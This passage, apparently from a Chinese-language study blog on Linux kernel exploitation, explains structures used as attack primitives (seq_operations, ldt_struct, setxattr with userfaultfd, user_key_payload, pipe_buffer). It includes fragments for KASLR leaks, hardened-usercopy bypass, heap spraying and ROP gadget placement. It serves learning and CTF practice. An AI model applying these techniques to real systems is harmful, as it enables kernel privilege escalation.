*m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址-text-段"><a href="#泄露内核基地址-text-段" class="headerlink" title="泄露内核基地址(.text 段)"></a>泄露内核基地址(.text 段)</h5><p><code>start</code>即为函数 <code>single_start</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;single_start&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="劫持内核执行流-1"><a href="#劫持内核执行流-1" class="headerlink" title="劫持内核执行流"></a>劫持内核执行流</h5><p>当 <code>read</code> 一个 <code>stat</code> 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数</p><p>只需要控制 <code>seq_operations-&gt;start</code> 后再用 <code>read</code>读取对应 <code>stat</code> 文件便能控制内核执行流（但是参数不可控，可以配合 <code>pt_reg</code>结构体使用）。</p><p>调试时可在 <code>seq_read_iter</code>函数处下断点。</p><p>可以选择覆盖 <code>start</code>函数指针为一个 <code>add_rsp_xxx_ret</code>类似的 <code>gadget</code>，将栈抬到 <code>pt_reg</code>结构体处，从而执行ROP。</p><h3 id="ldt-struct结构体"><a href="#ldt-struct结构体" class="headerlink" title="ldt_struct结构体"></a>ldt_struct结构体</h3><h3 id="ldt-struct-kmalloc-16-slub-kmalloc-32-slab"><a href="#ldt-struct-kmalloc-16-slub-kmalloc-32-slab" class="headerlink" title="ldt_struct: kmalloc-16(slub)&#x2F;kmalloc-32(slab)"></a>ldt_struct: kmalloc-16(slub)&#x2F;kmalloc-32(slab)</h3><p>在内核中与 LDT 相关联的结构体为 <code>ldt_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *       <span class="title">entries</span>;</span>              <span class="comment">/*     0   0x8 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>               nr_entries;           <span class="comment">/*   0x8   0x4 */</span></span><br><span class="line"><span class="type">int</span>                        slot;                 <span class="comment">/*   0xc   0x4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 16, cachelines: 1, members: 3 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 16 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>modify_ldt</code> 系统调用可以用来操纵对应进程的 <code>ldt_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泄露地址：modify-ldt-系统调用-read-ldt"><a href="#泄露地址：modify-ldt-系统调用-read-ldt" class="headerlink" title="泄露地址：modify_ldt 系统调用 - read_ldt()"></a>泄露地址：modify_ldt 系统调用 - read_ldt()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_ldt()</code> <strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong> ，若是能够控制 <code>ldt-&gt;entries</code> 便能够完成内核的任意地址读，由此泄露出内核数据。</p><p><code>copy_to_user()</code> 的一个特性：对于非法地址，其并不会造成 kernel panic，只会返回一个非零的错误码。我们可以多次修改 ldt-&gt;entries 并多次调用 <code>modify_ldt()</code> 以 爆破内核 .text 段地址与 page_offset_base ，若是成功命中，则 <code>modify_ldt</code> 会返回给我们一个非负值。</p><p>但是由于 <code>Hardened usercopy</code> 的存在，对于直接拷贝代码段上数据的行为会导致 kernel panic，但是在<strong>page_offset_base + 0x9d000 的地方（非代码段）存储着 secondary_startup_64 函数的地址，于是思路就是爆破page_offset_base的地址</strong></p><h4 id="绕过hardened-usercopy"><a href="#绕过hardened-usercopy" class="headerlink" title="绕过hardened usercopy"></a>绕过hardened usercopy</h4><p>通过 <code>fork</code>创建子进程，然后使用子进程来 <code>read_ldt</code> ，在 <code>fork</code>时，会将父进程的 <code>ldt</code>拷贝给子进程</p><p><img src="/image/learning_linux_kernel_2/1760624453851.png" alt="1760624453851"></p><h3 id="setxattr系统调用-GFP-KERNEL"><a href="#setxattr系统调用-GFP-KERNEL" class="headerlink" title="setxattr系统调用 GFP_KERNEL"></a>setxattr系统调用 GFP_KERNEL</h3><h4 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h4><p>可以通过以下方式使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">setxattr(<span class="string">&quot;/exploit&quot;</span>, <span class="string">&quot;username&quot;</span>, value, size, <span class="number">0</span>); <span class="comment">//第一个参数指定一个存在的文件，第二个参数随便</span></span><br></pre></td></tr></table></figure><p>该系统调用会走到下面这个函数：可以看到能够进行任意大小的 object 分配，size可控且内容可控，但是之后会被释放掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="利用-结合userfaultfd来堆占位"><a href="#利用-结合userfaultfd来堆占位" class="headerlink" title="利用- 结合userfaultfd来堆占位"></a>利用- 结合userfaultfd来堆占位</h5><p>我们申请一块连续的两页内存:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| memory1: size=pagesize | memory2: size=pagesize |</span><br></pre></td></tr></table></figure><p>随后,我们<strong>为第二部分的内存,注册 <code>userfaultfd</code></strong> , 使得访问到这里时直接卡住.</p><p><img src="/image/learning_linux_kernel_2/1760678357093.png" alt="1760709522108"></p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwn_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">register_userfaultfd_for_thread_stucking(&amp;monitor_setx, (<span class="type">void</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span>), <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="type">size_t</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span> - <span class="number">8</span>) = add_rsp_0x1f8 + kernel_offset;</span><br><span class="line">setxattr(<span class="string">&quot;/init&quot;</span>, <span class="string">&quot;ltfall&quot;</span>, (<span class="type">char</span>*)((<span class="type">size_t</span>)pwn_addr + <span class="number">0x1000</span> - <span class="number">8</span>), <span class="number">0x20</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>可以看到,我们上面便申请了一个 <code>kmalloc-32</code>的 <code>obj</code>,并写入了 <code>add_rsp_0x1f8</code>的 <code>gadget</code></p><h4 id="user-key-payload-kmalloc-any-GFP-KERNEL"><a href="#user-key-payload-kmalloc-any-GFP-KERNEL" class="headerlink" title="user_key_payload (kmalloc-any, GFP_KERNEL)"></a>user_key_payload (kmalloc-any, GFP_KERNEL)</h4><h5 id="定义：-4"><a href="#定义：-4" class="headerlink" title="定义："></a>定义：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="comment">//以上总共0x18字节</span></span><br><span class="line"><span class="type">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>rcu_head</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>在内核当中存在一个用于密钥管理的子系统，内核提供了 <code>add_key()</code> 系统调用进行密钥的创建，并提供了 <code>keyctl()</code> 系统调用进行密钥的读取、更新、销毁等功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,<span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">             <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">             <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们调用 <code>add_key()</code> 分配一个带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时，内核会经历如下过程：</p><ul><li>首先会在内核空间中分配 <code>obj1</code> 与 <code>obj2</code>，分配 <code>flag</code> 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> （字符串，最大大小为 <code>4096</code>）、<code>payload</code> （普通数据，大小无限制）</li><li>分配 <code>obj3</code> 保存 <code>description</code> ，分配 <code>obj4</code> 保存 <code>payload</code>，分配 <code>flag</code> 皆为 <code>GFP_KERNEL</code></li><li>释放 <code>obj1</code> 与 <code>obj2</code>，返回密钥 <code>id</code></li></ul><p>总而言之在保存 <code>description</code>和 <code>payload</code>时都会分别利用中间体 <code>obj</code></p><h5 id="调用-keyctl-read系统调用越界读"><a href="#调用-keyctl-read系统调用越界读" class="headerlink" title="调用 keyctl_read系统调用越界读"></a>调用 <code>keyctl_read</code>系统调用越界读</h5><p>控制 <code>user_key_payload</code> 结构体中的 <code>datalen</code>为一个大于其 <code>payload</code>长度的数字，读到其他被释放的 <code>user_key_payload</code> ，即可读到 <code>rcu-&gt;func</code> 和 <code>rcu-&gt;func</code> 。</p><h5 id="泄露内核基地址"><a href="#泄露内核基地址" class="headerlink" title="泄露内核基地址"></a>泄露内核基地址</h5><p>利用 <code>key_revoke</code>来销毁密钥时，<code>rcu-&gt;func</code>将会被赋值为 <code>user_free_payload_rcu</code>函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;user_free_payload_rcu&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="泄露内核堆地址"><a href="#泄露内核堆地址" class="headerlink" title="泄露内核堆地址"></a>泄露内核堆地址</h5><p>读取 <code>rcu-&gt;func</code>泄露堆地址</p><h3 id="pipe-管道相关"><a href="#pipe-管道相关" class="headerlink" title="pipe 管道相关"></a>pipe 管道相关</h3><h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><h5 id="定义：-5"><a href="#定义：-5" class="headerlink" title="定义："></a>定义：</h5><p>当我们 <code>void pipe(int fd[])</code>打开管道时，会创建两个结构体，分别为 <code>pipe_inode_info</code> （<code>kmalloc-192 | GFP_KERNEL_ACCOUNT</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">//***</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_inode_info-&gt;bufs</code> 为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址</p><p>和 <code>pipe_buffer</code> （<code>kmalloc-1k | GFP_KERNEL_ACCOUNT</code>），往 <code>pipe_fd[1]</code>中写入数据成功后才会初始化 <code>pipe_buffer</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pipe_buffer_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer init&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;QQEEDD&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pipe_fd[i][0]：这是管道的 读取端 (Read End)。通过这个文件描述符从管道缓冲区中读取数据。</span></span><br><span class="line"><span class="comment">pipe_fd[i][1]：这是管道的 写入端 (Write End)。通过这个文件描述符向管道缓冲区中写入数据。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="/image/learning_linux_kernel_2/1760602477857.png" alt="1760602477857"></p><p>具体到每个 <code>pipe_buffer</code> 其中的 <code>offset</code> 和 <code>len</code> 标记了 <code>pipe_buffer</code> 对应内存页中的数据。</p><p><img src="/image/learning_linux_kernel_2/1760602494097.png" alt="1760602494097"></p><p>可以通过系统调用更改pipe_buffer的大小</p><p>当选项为 <code>F_SETPIPE_SZ</code> 其会修改当前pipe的bufs数组大小为第三个参数 <code>(arg&gt;&gt;12)*sizeof(*bufs)</code> 注意arg&gt;&gt;12（2^12&#x3D;0x1000）必须是2的幂次方 <code>sizeof(*bufs)=64</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pipe_buffer_resize</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pipe buffer resize&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">4</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);  </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>pipe_buf_operations</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址-1"><a href="#泄露内核基地址-1" class="headerlink" title="泄露内核基地址"></a>泄露内核基地址</h5><p><code>pipe_buffer-&gt;pipe_buf_operations</code>指向全局函数表</p><h5 